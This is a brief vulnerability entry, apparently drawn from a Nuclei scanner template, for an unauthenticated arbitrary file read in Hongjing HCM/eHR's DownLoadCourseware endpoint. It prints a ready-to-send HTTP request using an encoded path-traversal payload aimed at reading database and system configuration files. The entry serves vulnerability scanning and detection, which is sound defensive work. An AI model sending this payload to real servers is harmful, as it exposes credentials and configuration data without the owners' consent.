# Vulnerability: Hongjing HCM - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`hjsoft-hcm-lfi.yaml`)

## Description
There is an arbitrary file read vulnerability in the Hongjing eHR /DownLoadCourseware interface. Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
Host: {{Hostname}}
```

